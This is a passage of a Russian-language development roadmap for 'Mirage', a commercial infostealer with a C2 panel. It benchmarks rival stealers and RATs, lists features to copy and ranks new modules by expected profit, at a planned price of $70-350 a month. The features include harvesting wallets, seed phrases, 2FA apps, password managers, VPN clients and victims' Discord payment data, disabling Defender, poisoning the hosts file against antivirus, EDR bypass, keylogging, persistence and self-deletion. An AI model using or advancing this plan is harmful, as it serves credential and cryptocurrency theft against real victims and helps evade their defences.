| **App-Bound v20** | ✅ 3 флага (AES key, ChaCha20, CNG + NCrypt) | ✅ COM Elevator + inject |
| **Wallet extensions** | **76** (+2FA 7 + PM 8) | **62** |
| **Desktop wallets** | **33** | **10** |
| **Messengers** | 12 (Discord, TG, Signal, Element, ICQ, SIP, Jabber, Outlook, Pidgin, Skype, Tox, Viber) | 4 |
| **VPN clients** | **18** (Nord, OpenVPN, WireGuard, SurfShark, Express, CyberGhost, PIA, Mullvad, Hamachi и др.) | ❌ |
| **Games** | **10** (Steam, MC (13 launchers), BattleNet, Epic, Riot, Roblox, Uplay, Xbox, Growtopia, EA) | 5 |
| **Seed phrase grabber** | ✅ Regex сканирование дисков + облачные хранилища | ❌ |
| **2FA Authenticators** | ✅ 7 (Google, MS, Authy, Duo, OTP, FreeOTP) | ❌ |
| **Password Managers** | ✅ 8 (Dashlane, Keeper, KeePass, Bitwarden, NordPass и др.) | ❌ |
| **Yandex Passman** | ✅ | ❌ |
| **Parallel collection** | ✅ Task.WhenAll / Parallel.ForEach | ❌ Single-threaded |
| **Anti-VM** | ❌ Нет | ✅ 13 weighted checks |
| **EDR bypass** | ❌ P/Invoke WinAPI | ✅ Halo's Gate + Gadget Pool |
| **Exfiltration** | Telegram Bot (один канал) | Panel (HTTPS) + Telegram backup |
| **Cleanup** | ❌ Нет (оставляет логи) | ✅ Self-delete + temp wipe |

**Что взять:**
- **VPN clients (18)** — NordVPN, OpenVPN, WireGuard, ExpressVPN, SurfShark, CyberGhost, PIA, Mullvad, Hamachi и др.
- **2FA Authenticators (7)** — добавить сбор Google/MS/Authy/Duo/OTP/Aegis расширений
- **Password Managers (8)** — Dashlane, Keeper, KeePass, Bitwarden, NordPass
- **Seed phrase grabber** — сканирование дисков + облачных хранилищ на BIP39
- **Yandex Passman** — поддержка Яндекс.Браузер менеджера паролей
- **App-Bound v20 Flags 1-3** — альтернативные методы расшифровки (CNG)

**Intelix превосходит Mirage в:** coverage browsers (102 vs 68), wallets (109 vs 72), messengers (12 vs 4), VPN (18 vs 0), games (10 vs 5), seed grabber, 2FA, PM
**Mirage превосходит Intelix в:** EDR bypass (Halo's Gate vs P/Invoke), anti-VM (13 checks vs 0), архитектура Zig (no CRT vs .NET), self-delete, clipper, panel (Go SPA vs Telegram only)

---

### 8.2 LegionStealerStub (C# .NET 4.8)

| Аспект | LegionStealerStub | Mirage |
|--------|-------------------|--------|
| **Браузеры** | 13 Chromium | 68 (58+10) |
| **Расшифровка** | DPAPI + AES-GCM (BCrypt CNG) | DPAPI + AES-GCM + ChaCha20-Poly1305 |
| **App-Bound v20** | ❌ | ✅ |
| **Wallets** | 10 desktop | 72 (62 ext + 10 desktop) |
| **Messengers** | Discord (23 paths + billing/gifts) + Telegram | Discord + TG + Signal + Pidgin |
| **Discord billing/gifts** | ✅ `GET /users/@me/billing/payment-sources` | ❌ |
| **Games** | Minecraft (14 launchers) + Roblox | Steam + Uplay + MC (17) + BattleNet + Roblox |
| **Webcam** | ✅ DirectShow COM | ❌ |
| **Anti-VM** | ✅ UUID/ComputerName/Username/HostingIP/Process/Debugger | ✅ 13 weighted checks |
| **Hosts file poisoning** | ✅ 29 AV domains → 127.0.0.1 | ❌ |
| **Defender disable** | ✅ Registry + PowerShell Set-MpPreference | ❌ |
| **Self-delete** | ✅ (Melt mode + batch) | ✅ 3 уровня |
| **Exfiltration** | Discord Webhook | Panel (HTTPS) + Telegram |
| **EDR bypass** | ❌ WinAPI | ✅ Halo's Gate + Gadget Pool |

**Что взять:**
- **Discord billing/gift scraping** — узнать есть ли карты/PayPal/Nitro у жертвы через Discord API
- **Hosts file poisoning** — блокировка AV доменов
- **Defender disable** — отключение Windows Defender через registry + PowerShell
- **Anti-VM hosting IP check** — проверка через ip-api.com на датацентр/хостинг

**Вердикт:** LegionStealerStub слабее Mirage почти по всем метрикам, кроме Discord billing scraping и антивирусных техник (hosts poisoning, defender disable).

---

### 8.3 nexus-stealer (React/Django Panel — только панель, билда нет)

| Аспект | nexus-stealer | Mirage Panel |
|--------|---------------|--------------|
| **Тип** | Только C2 панель (без билда) | Stealer + C2 panel |
| **Backend** | Django + Python | Go + chi-router |
| **Frontend** | React + Vite + Tailwind | Vite SPA |
| **Auth** | Discord OAuth2 + Email OTP + Turnstile | JWT + multi-user RBAC |
| **2FA** | ✅ TOTP (pyotp + QR) | ❌ |
| **Community chat** | ✅ Full-featured (emoji, GIF, Tenor, @mentions) | ❌ |
| **Support tickets** | ✅ | ❌ |
| **Marketplace/Shop** | ✅ Premium modules store | ❌ |
| **Admin panel** | ✅ User/bans/notifications | ✅ (через RBAC) |
| **IP Security scoring** | ✅ Multi-API (ip-api, ipapi.co, proxycheck.io) | ❌ |
| **Session management** | ✅ Device tracking + remote terminate | ❌ |
| **Docs/Wiki** | ✅ Full in-panel documentation | ❌ |
| **Data persistence** | ❌ В памяти (всё теряется при перезапуске) | ✅ SQLite (постоянно) |
| **Secrets exposure** | ❌ Hardcoded в .env (Discord, Turnstile) | ✅ Через env переменные |
| **CSRF/CORS** | ❌ @csrf_exempt + CORS_ALLOW_ALL | ✅ |

**Что взять:**
- **TOTP 2FA** — добавить в Mirage Panel для админ-аккаунтов
- **IP Security scoring** — мульти-API проверка IP перед логином
- **In-panel documentation** — ссылаться на docs/ из панели

**Вердикт:** nexus-stealer — это красивая обёртка без бекенда (всё в памяти). Mirage Panel технически намного надёжнее.

---

## 9. ПРИОРИТЕТЫ (ОБНОВЛЁННЫЕ)

### P0 — Максимальный профит (сделать первым)
| # | Модуль | Время | Влияние | Откуда |
|---|--------|-------|---------|--------|
| 1 | Clipper | 1 день | 💰💰💰💰💰 | — |
| 2 | Loader | 1 день | 💰💰💰💰 | — |
| 3 | **Keylogger (WH_KEYBOARD_LL)** | 2 дня | 💰💰💰💰 | Overlord, XWorm, Legion |
| 4 | **Persistence Multi-Method** | 2-3 дня | 🛡️ opsec | Overlord (registry + scheduler + WMI) |
| 5 | **Stack Spoofing** | 2-3 дня | 🛡️ EDR bypass | Overlord (garble cflow), STORM |
| 6 | Self-Delete + Melt | 0.5 дня | 🛡️ opsec | — |

### P1 — Ключевые улучшения
| # | Модуль | Время | Влияние | Откуда |
|---|--------|-------|---------|--------|
| 7 | **VPN clients (18)** | 2 дня | 📈 coverage | Intelix |
| 8 | **Discord billing/gifts** | 1 день | 💰💰💰 | LegionStealerStub |
| 9 | **Hosts file poisoning** | 0.5 дня | 🛡️ AV bypass | LegionStealerStub |
| 10 | **Defender disable** | 0.5 дня | 🛡️ AV bypass | LegionStealerStub |
| 11 | **Reverse Proxy (SOCKS5)** | 3-5 дней | 🛡️ stealth | Overlord, NyashRat |
| 12 | Server-Side Processing | 3 дня | 🛡️ stealth | — |
| 13 | Чанковая отправка | 1-2 дня | 🛡️ reliability | — |
| 14 | Google OAuth Tokens | 1-2 дня | 💰💰💰 | — |
| 15 | Поиск и фильтры панели | 2 дня | 🎯 usability | — |

### P2 — Расширение покрытия
| # | Модуль | Время | Влияние | Откуда |
|---|--------|-------|---------|--------|
| 16 | **2FA Authenticators (7)** | 1 день | 📈 coverage | Intelix |
| 17 | **Password Managers (8)** | 1 день | 📈 coverage | Intelix |
| 18 | **Seed phrase grabber** | 1-2 дня | 💰💰💰💰 | Intelix |
| 19 | **Yandex Passman** | 1 день | 📈 coverage | Intelix |
| 20 | FTP/Email клиенты | 2 дня | 📈 coverage | — |
| 21 | Telegram моды + мессенджеры | 2 дня | 📈 coverage | — |
| 22 | Chrome Backstage Injection | 5-7 дней | 🎯 unique | Overlord |
| 23 | Wallet Injection | 1 день | 💰💰💰💰 | — |
| 24 | Прокладки (Bridges) | 2 дня | 🛡️ stealth | — |
| 25 | Regex-граббер | 1 день | 💰💰💰 | — |

### P3 — Премиум функции
| # | Модуль | Время | Влияние |
|---|--------|-------|---------|
| 26 | Multi-user / Team | 3-5 дней | 💰 Team тариф |
| 27 | Discord Injection | 2 дня | 💰💰💰 |
| 28 | Cookie Restore | 2 дня | 🎯 utility |
| 29 | Публичная статистика | 0.5 дня | 🎯 marketing |
| 30 | NTDLL Unhook | 2 дня | 🛡️ EDR bypass |
| 31 | TOTP 2FA для Panel | 1 день | 🔐 security |
| 32 | IP Security scoring (Panel) | 1 день | 🔐 security |
| 33 | In-panel docs/knowledge base | 1 день | 🎯 UX |

### P4 — Нишевые / будущие
| # | Модуль | Время | Влияние |
|---|--------|-------|---------|
| 34 | Epic Games, Riot Games | 1 день | 📈 coverage |
| 35 | Webcam | 1-2 дня | 💰 |
| 36 | Multi-platform build (Linux/macOS) | недели | 📈 market |
| 37 | Resident Module (ботнет) | 5+ дней | 💰💰💰💰 |
| 38 | Metamorphism (OLLVM) | 3+ дня | 🛡️ FUD |
| 39 | PostgreSQL upgrade | 2-3 дня | ⚡ performance |
| 40 | Community chat + support tickets | 3-5 дней | 🎯 UX |
| 41 | Marketplace / модуль store | 2-3 дня | 💰 |

---

## 10. СРАВНИТЕЛЬНАЯ ТАБЛИЦА (РАСШИРЕННАЯ)

| Функция | Volta $250 | Intelix | Legion | Overlord (RAT) | **Mirage (сейчас)** | **Mirage цель** |
|---------|-----------|---------|--------|----------------|--------------------|---------|
| Язык | C+ASM | C# .NET | C# .NET | Go | **Zig** | **Zig** |
| Вес | ~210 KB | ~200 KB | ~200 KB | ~15 MB | **123 KB** | **<200 KB** |
| EDR bypass | Partial | ❌ | ❌ | ❌ (WinAPI) | **Halo's Gate** | **Halo's + Stack Spoofing** |
| Anti-VM checks | ✅ | ❌ | ✅ 5 | ❌ | ✅ **13 weighted** | ✅ **15+** |
| Браузеры | 100+ | **102** | 13 | ❌ (backstage) | 68 | **100+** |
| Wallets | 60+ | **109** (76 ext + 33 desk) | 10 | ❌ | 72 | **110+** |
| Messengers | ✅ | **12** | 2 (+billing) | ❌ | 4 | **15+** |
| VPN | ✅ | **18** | ❌ | ❌ | ❌ | **18** |
| Games | ✅ | **10** | 2 | ❌ | 5 | **12** |
| Discord billing | ❓ | ❌ | ✅ | ❌ | ❌ | **✅** |
| 2FA authenticators | ❌ | **7** | ❌ | ❌ | ❌ | **7** |
| Password managers | ❌ | **8** | ❌ | ❌ | ❌ | **8** |
| Seed phrase grabber | ✅ | ✅ | ❌ | ❌ | ❌ | **✅** |
| Keylogger | ❌ | ❌ | ❌ | **✅** | ❌ | **✅** |
| Webcam | ❌ | ❌ | **✅** | **✅ (WebRTC)** | ❌ | **✅** |
| Reverse Proxy | ❌ | ❌ | ❌ | **✅ SOCKS5** | ❌ | **✅** |
| Persistence multi | ❌ | ❌ | ✅ | **✅ 4 метода** | ❌ (Run key) | **✅ 4+** |
| Hosts poisoning | ❌ | ❌ | **✅** | ❌ | ❌ | **✅** |
| Defender disable | ❌ | ❌ | **✅** | ❌ | ❌ | **✅** |
| Multi-platform | ❌ | ❌ | ❌ | **✅ Win/Mac/Linux** | ❌ | **✅** |
| Self-delete | ✅ | ❌ | ✅ | ✅ | ✅ | **✅** |
| C2 Panel | PHP | **Telegram only** | Discord Webhook | Node/TS + Electron | **Go + SPA** | **Go + SPA** |
| 2FA для панели | ❌ | ❌ | ❌ | ✅ OIDC/SSO | ❌ | **✅ TOTP** |
| Цена/мес | $250-650 | Free/leak | Free | Free | **Free** | **$70-350** |
